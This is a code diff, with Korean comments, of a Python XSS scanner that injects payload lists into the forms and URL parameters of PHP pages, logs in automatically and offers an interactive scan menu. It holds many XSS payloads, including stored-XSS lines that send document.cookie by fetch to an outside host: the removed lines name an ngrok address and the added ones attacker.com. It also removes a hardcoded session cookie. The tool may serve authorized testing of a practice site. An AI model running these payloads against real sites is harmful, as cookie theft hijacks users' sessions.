@@ -10,6 +10,20 @@ class XSSScanner:
     def __init__(self, target_url, session_cookie=None):
         self.target_url = target_url
         self.session = requests.Session()
+        
+        # 타임아웃 설정 추가
+        self.session.timeout = 30
+        
+        # 헤더 설정 추가
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        })
+        
         if session_cookie:
             self.session.cookies.set('PHPSESSID', session_cookie)
 
@@ -21,48 +35,80 @@ class XSSScanner:
                 '<svg onload=alert(1)>',
                 '"><script>alert(1)</script>',
                 "';alert(1);//",
+                '"><img src=x onerror=alert(1)>',
+                '\'><script>alert(1)</script>',
             ],
             'advanced': [
                 '<img src=x onerror="javascript:alert(1)">',
                 '<body onload=alert(1)>',
                 '<iframe src="javascript:alert(1)">',
-                '<input onfocus=alert(1)>',
-                '<select onfocus=alert(1)>',
-                '<textarea onfocus=alert(1)>',
-                '<keygen onfocus=alert(1)>',
+                '<input onfocus=alert(1) autofocus>',
+                '<select onfocus=alert(1) autofocus>',
+                '<textarea onfocus=alert(1) autofocus>',
+                '<keygen onfocus=alert(1) autofocus>',
                 '<video><source onerror="alert(1)">',
                 '<audio src=x onerror=alert(1)>',
                 '<details open ontoggle=alert(1)>',
+                '<marquee onstart=alert(1)>',
             ],
             'encoding_bypass': [
                 '&#60;script&#62;alert(1)&#60;/script&#62;',
                 '\u003cscript\u003ealert(1)\u003c/script\u003e',
                 '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+                '&lt;script&gt;alert(1)&lt;/script&gt;',
             ],
             'filter_bypass': [
                 '<ScRiPt>alert(1)</ScRiPt>',
                 '<script>alert`1`</script>',
                 '<script>alert(/XSS/)</script>',
                 '<script>alert(String.fromCharCode(88,83,83))</script>',
+                '<<script>alert(1);//<</script>',
+                '<scr<script>ipt>alert(1)</scr</script>ipt>',
             ]
         }
 
         self.vulnerable_inputs = []
         self.test_results = []
 
+    def test_connection(self):
+        """서버 연결 테스트"""
+        try:
+            response = self.session.get(self.target_url, timeout=10)
+            print(f"[+] Connection successful: {self.target_url} (Status: {response.status_code})")
+            return True
+        except requests.exceptions.ConnectTimeout:
+            print(f"[-] Connection timeout: {self.target_url}")
+            return False
+        except requests.exceptions.ConnectionError:
+            print(f"[-] Connection error: {self.target_url}")
+            return False
+        except Exception as e:
+            print(f"[-] Error: {str(e)}")
+            return False
+
     def scan_page(self, page_url):
         """특정 페이지의 입력 필드를 찾아 XSS 테스트"""
         try:
-            response = self.session.get(page_url)
+            response = self.session.get(page_url, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
 
+            # 디버그 정보 출력
+            print(f"  - Page title: {soup.title.string if soup.title else 'No title'}")
+            
             # 폼 찾기
             forms = soup.find_all('form')
-            for form in forms:
+            print(f"  - Found {len(forms)} forms")
+            
+            for i, form in enumerate(forms):
+                print(f"  - Testing form {i+1}...")
                 self.test_form(page_url, form)
 
             # URL 파라미터 테스트
             self.test_url_params(page_url)
+
+            # 추가: 모든 입력 필드 직접 찾기
+            all_inputs = soup.find_all(['input', 'textarea'])
+            print(f"  - Found {len(all_inputs)} input fields total")
 
         except Exception as e:
             print(f"Error scanning {page_url}: {str(e)}")
@@ -71,22 +117,27 @@ class XSSScanner:
         """폼의 각 입력 필드에 XSS 페이로드 테스트"""
         action = form.get('action', '')
         method = form.get('method', 'get').lower()
-        form_url = urljoin(page_url, action)
+        form_url = urljoin(page_url, action) if action else page_url
 
         # 입력 필드 찾기
         inputs = form.find_all(['input', 'textarea', 'select'])
+        
+        # 디버그 정보
+        print(f"    - Form action: {action}, method: {method}")
+        print(f"    - Input fields: {[inp.get('name') for inp in inputs if inp.get('name')]}")
 
         for input_field in inputs:
             input_name = input_field.get('name')
             input_type = input_field.get('type', 'text')
 
-            if not input_name or input_type in ['submit', 'button']:
+            if not input_name or input_type in ['submit', 'button', 'reset']:
                 continue
 
             # 각 페이로드로 테스트
             for category, payloads in self.payloads.items():
-                for payload in payloads:
+                for payload in payloads[:2]:  # 처음 몇 개만 테스트
                     self.test_input(form_url, method, input_name, payload, category)
+                    time.sleep(0.5)  # Rate limiting
 
     def test_input(self, url, method, param_name, payload, category):
         """특정 입력 필드에 페이로드 주입 테스트"""
@@ -94,12 +145,14 @@ class XSSScanner:
 
         try:
             if method == 'post':
-                response = self.session.post(url, data=test_data)
+                response = self.session.post(url, data=test_data, timeout=10)
             else:
-                response = self.session.get(url, params=test_data)
+                response = self.session.get(url, params=test_data, timeout=10)
 
             # XSS 취약점 확인
-            if self.check_vulnerability(response.text, payload):
+            vulnerable = self.check_vulnerability(response.text, payload)
+            
+            if vulnerable:
                 vulnerability = {
                     'url': url,
                     'method': method,
@@ -110,6 +163,7 @@ class XSSScanner:
                 }
                 self.vulnerable_inputs.append(vulnerability)
                 print(f"[VULNERABLE] {url} - {param_name} - {category}")
+                print(f"  Payload: {payload}")
 
             # 결과 저장
             self.test_results.append({
@@ -118,7 +172,7 @@ class XSSScanner:
                 'parameter': param_name,
                 'payload': payload,
                 'category': category,
-                'vulnerable': self.check_vulnerability(response.text, payload),
+                'vulnerable': vulnerable,
                 'response_code': response.status_code,
                 'timestamp': datetime.now().isoformat()
             })
@@ -128,29 +182,40 @@ class XSSScanner:
 
     def test_url_params(self, url):
         """URL 파라미터를 통한 Reflected XSS 테스트"""
-        # URL에 test 파라미터 추가
-        test_params = ['name', 'email', 'full_name']
+        # 일반적인 파라미터 이름들
+        test_params = ['q', 'search', 'query', 'keyword', 'name', 'email', 'message', 
+                      'comment', 'text', 'input', 'data', 'value', 'content', 'id',
+                      'user', 'username', 'title', 'description', 'full_name']
 
+        print(f"  - Testing URL parameters...")
+        
         for param in test_params:
-            for category, payloads in self.payloads.items():
-                for payload in payloads:
-                    test_url = f"{url}?{param}={quote(payload)}"
-                    try:
-                        response = self.session.get(test_url)
-                        if self.check_vulnerability(response.text, payload):
-                            vulnerability = {
-                                'url': url,
-                                'method': 'GET',
-                                'parameter': param,
-                                'payload': payload,
-                                'category': category,
-                                'type': 'reflected',
-                                'timestamp': datetime.now().isoformat()
-                            }
-                            self.vulnerable_inputs.append(vulnerability)
-                            print(f"[VULNERABLE - Reflected] {url} - {param}")
-                    except:
-                        pass
+            # 간단한 페이로드로 먼저 테스트
+            simple_payload = '<script>alert(1)</script>'
+            test_url = f"{url}?{param}={quote(simple_payload)}"
+            
+            try:
+                response = self.session.get(test_url, timeout=10)
+                if self.check_vulnerability(response.text, simple_payload):
+                    vulnerability = {
+                        'url': url,
+                        'method': 'GET',
+                        'parameter': param,
+                        'payload': simple_payload,
+                        'category': 'reflected',
+                        'type': 'reflected',
+                        'timestamp': datetime.now().isoformat()
+                    }
+                    self.vulnerable_inputs.append(vulnerability)
+                    print(f"[VULNERABLE - Reflected] {url} - {param}")
+                    
+                    # 취약한 파라미터에 대해 더 많은 페이로드 테스트
+                    for category, payloads in self.payloads.items():
+                        for payload in payloads[:2]:
+                            self.test_input(url, 'GET', param, payload, category)
+                            
+            except Exception as e:
+                pass
 
     def check_vulnerability(self, response_text, payload):
         """응답에서 페이로드가 그대로 반영되었는지 확인"""
@@ -158,17 +223,16 @@ class XSSScanner:
         if payload in response_text:
             return True
         
-        # 인코딩된 형태로 체크
-        encoded_checks = [
-            payload.replace('<', '&lt;').replace('>', '&gt;'),
-            quote(payload),
-            payload.replace('"', '&quot;').replace("'", '&#39;')
-        ]
-
-        for check in encoded_checks:
-            if check in response_text:
-                # 부분적으로 인코딩되었지만 여전히 취약할 수 있음
-                return self.deep_check(response_text, payload)
+        # 부분적으로 포함되어 있는지 체크
+        # <script>alert(1)</script> -> alert(1)가 포함되어 있는지
+        script_content = re.search(r'<script[^>]*>(.*?)</script>', payload, re.IGNORECASE)
+        if script_content and script_content.group(1) in response_text:
+            return True
+        
+        # 이벤트 핸들러 체크
+        event_match = re.search(r'on\w+\s*=\s*["\']?(.*?)["\']?[\s>]', payload, re.IGNORECASE)
+        if event_match and event_match.group(1) in response_text:
+            return True
             
         return False
     
@@ -198,7 +262,10 @@ class XSSScanner:
             'upload.php',
             'profile.php',
             'new_post.php',
-            'file.php'
+            'file.php',
+            'register.php',
+            'search.php',
+            'comment.php'
         ]
 
         for page in pages:
@@ -316,41 +383,8 @@ class XSSScanner:
         with open('xss_report.html', 'w', encoding='utf-8') as f:
             f.write(html_content)
 
-# 사용 예시
-if __name__ == "__main__":
-    # 타겟 URL 설정
-    target_url = input("target_url을 입력하세요: ").strip() # 실제 타겟 URL로 변경
-
-    # 세션 쿠키가 필요한 경우 (로그인 후 테스트)
-    session_cookie = "br33h4es1vgq2a2k038mmkbl4f" # 실제 세션 쿠키로 변경
-
-    # 스캐너 초기화
-    scanner = XSSScanner(target_url, session_cookie)
-
-    # 모든 페이지 스캔
-    print("[*] Starting XSS vulnerability scan...")
-    scanner.scan_all_pages()
-
-    # 특정 페이지만 스캔하고 싶은 경우
-    # scanner.scan_page(urljoin(target_url, 'new_post.php'))
-
-    # 리포트 생성
-    report = scanner.generate_report()
-
-    # 결과 요약 출력
-    print("\n" + "="*50)
-    print("SCAN SUMMARY")
-    print("="*50)
-    print(f"Total vulnerabilities found: {len(scanner.vulnerable_inputs)}")
-
-    if scanner.vulnerable_inputs:
-        print("\nVulnerable endpoints:")
-        for vuln in scanner.vulnerable_inputs:
-            print(f"  - {vuln['url']} ({vuln['parameter']}) - {vuln['category']}")
-
 
 # 페이지별 특화 테스트 클래스
-
 class AdvancedXSSScanner(XSSScanner):
     def __init__(self, target_url, session_cookie=None):
         super().__init__(target_url, session_cookie)
@@ -360,8 +394,8 @@ class AdvancedXSSScanner(XSSScanner):
             'new_post.php': [
                 # 게시글 작성 페이지 - Stored XSS
                 '<script>document.cookie</script>',
-                '<img src=x onerror="fetch(\'https://irremeable-zoe-scabrous.ngrok-free.dev/webhook?c=\'+document.cookie)">',
-                '<svg/onload="location.href=\'https://irremeable-zoe-scabrous.ngrok-free.dev\'">',
+                '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
+                '<svg/onload="location.href=\'http://attacker.com\'">',
             ],
             'profile.php': [
                 # 프로필 페이지 - 이메일/이름 필드
@@ -542,7 +576,7 @@ class XSSAutomation:
         }
 
         try:
-            response = self.session.post(login_url, data=login_data)
+            response = self.session.post(login_url, data=login_data, timeout=10)
             if 'index.php' in response.text or 'logout' in response.text:
                 print("[+] Login successful")
                 return self.session.cookies.get('PHPSESSID')
@@ -600,24 +634,152 @@ class XSSAutomation:
                     print(f"    Parameter: {vuln.get('parameter', vuln.get('field', 'N/A'))}")
                     print(f"    Payload: {vuln['payload'][:50]}...")
 
+
 # 실행 예시
 if __name__ == "__main__":
-    # 설정
-    TARGET_URL = input("Target URL을 입력하세요. (예: http://localhost/vulnerable_site/) : ").strip()
-    USERNAME = input("Username을 입력하세요: ").strip()
-    PASSWORD = input("Password를 입력하세요: ").strip()
-
-    # URL이 슬래시로 끝나지 않으면 추가
-    if not TARGET_URL.endswith('/'):
-        TARGET_URL += '/'
-
-    # 입력값 확인
-    print(f"\n[설정된 값]")
-    print(f"Target URL: {TARGET_URL}")
-    print(f"Username: {USERNAME}")
-    print(f"Password: {PASSWORD}")
-    print()
-
-    # 자동화 실행
-    automation = XSSAutomation(TARGET_URL)
-    report = automation.run_full_scan(USERNAME, PASSWORD)
+    # 첫 번째 대화형 모드
+    target_url = input("Target URL을 입력하세요: ").strip()
+    
+    # URL 정규화
+    if not target_url.startswith('http'):
+        target_url = 'http://' + target_url
+    if not target_url.endswith('/'):
+        target_url += '/'
+    
+    # 세션 쿠키 입력 (선택사항)
+    session_cookie = input("Session cookie (PHPSESSID) [Enter to skip]: ").strip()
+    
+    # 스캐너 초기화
+    scanner = XSSScanner(target_url, session_cookie if session_cookie else None)
+    
+    # 연결 테스트
+    print(f"\n[*] Testing connection to {target_url}...")
+    if not scanner.test_connection():
+        print("[-] Failed to connect to target. Please check:")
+        print("  1. The URL is correct")
+        print("  2. The server is running")
+        print("  3. Your network connection")
+        print("  4. Any firewall/security settings")
+        
+        # 다른 포트 시도
+        alternative_ports = ['8080', '8000', '3000']
+        for port in alternative_ports:
+            alt_url = target_url.replace(':80/', f':{port}/')
+            print(f"\n[*] Trying alternative port: {alt_url}")
+            scanner.target_url = alt_url
+            if scanner.test_connection():
+                target_url = alt_url
+                break
+        else:
+            exit(1)
+    
+    # 스캔 모드 선택
+    print("\n[*] Select scan mode:")
+    print("1. Basic scan (faster)")
+    print("2. Comprehensive scan with login (recommended)")
+    print("3. Custom pages scan")
+    
+    mode = input("\nEnter your choice (1-3): ").strip()
+    
+    if mode == '1':
+        # 기본 스캔
+        print("\n[*] Starting basic XSS vulnerability scan...")
+        scanner.scan_all_pages()
+        
+    elif mode == '2':
+        # 로그인 정보 입력
+        print("\n[*] Enter login credentials:")
+        username = input("Username: ").strip()
+        password = input("Password: ").strip()
+        
+        # 자동화 스캔
+        automation = XSSAutomation(target_url)
+        report = automation.run_full_scan(username, password)
+        
+        if report:
+            print("\n[+] Scan completed successfully!")
+        else:
+            print("\n[-] Scan failed. Falling back to basic scan...")
+            scanner.scan_all_pages()
+            
+    elif mode == '3':
+        # 커스텀 페이지 스캔
+        print("\n[*] Enter pages to scan (separated by comma):")
+        print("Example: index.php,login.php,profile.php")
+        pages_input = input("Pages: ").strip()
+        pages = [p.strip() for p in pages_input.split(',')]
+        
+        for page in pages:
+            page_url = urljoin(target_url, page)
+            print(f"\n[*] Scanning {page_url}...")
+            scanner.scan_page(page_url)
+            time.sleep(1)
+    
+    else:
+        print("[-] Invalid choice. Running basic scan...")
+        scanner.scan_all_pages()
+    
+    # 리포트 생성
+    print("\n[*] Generating report...")
+    report = scanner.generate_report()
+    
+    # 결과 출력
+    print("\n" + "="*50)
+    print("SCAN SUMMARY")
+    print("="*50)
+    print(f"Target: {target_url}")
+    print(f"Total tests performed: {len(scanner.test_results)}")
+    print(f"Vulnerabilities found: {len(scanner.vulnerable_inputs)}")
+    
+    if scanner.vulnerable_inputs:
+        print("\n[!] VULNERABILITIES FOUND:")
+        print("-" * 50)
+        
+        # 타입별로 그룹화
+        vuln_by_type = {}
+        for vuln in scanner.vulnerable_inputs:
+            vuln_type = vuln.get('type', vuln.get('category', 'Unknown'))
+            if vuln_type not in vuln_by_type:
+                vuln_by_type[vuln_type] = []
+            vuln_by_type[vuln_type].append(vuln)
+        
+        for vuln_type, vulns in vuln_by_type.items():
+            print(f"\n{vuln_type} ({len(vulns)} found):")
+            for vuln in vulns:
+                print(f"  - URL: {vuln['url']}")
+                print(f"    Parameter: {vuln.get('parameter', vuln.get('field', 'N/A'))}")
+                print(f"    Payload: {vuln['payload'][:50]}...")
+                print(f"    Method: {vuln.get('method', 'N/A')}")
+    else:
+        print("\n[+] No vulnerabilities found.")
+        print("This could mean:")
+        print("  1. The application is secure")
+        print("  2. XSS protections are in place")
+        print("  3. Need to test with authentication")
+        print("  4. Need more specific payloads")
+    
+    print(f"\n[+] Full report saved to:")
+    print(f"  - JSON: xss_report.json")
+    print(f"  - HTML: xss_report.html")
+    
+    # 추가 권장사항
+    print("\n[*] Recommendations:")
+    if len(scanner.vulnerable_inputs) > 0:
+        print("  1. Fix all identified vulnerabilities")
+        print("  2. Implement input validation and output encoding")
+        print("  3. Use Content Security Policy (CSP)")
+        print("  4. Regular security testing")
+    else:
+        print("  1. Test with authenticated session")
+        print("  2. Try manual testing for complex scenarios")
+        print("  3. Check for DOM-based XSS manually")
+        print("  4. Test file upload functionality")
+    
+    # 수동 테스트 안내
+    print("\n[*] For manual testing, try these payloads:")
+    print('  - <script>alert(document.cookie)</script>')
+    print('  - <img src=x onerror="alert(1)">')
+    print('  - javascript:alert(1)')
+    print('  - <svg/onload=alert(1)>')
+    
+    print("\n[*] Scan completed!")
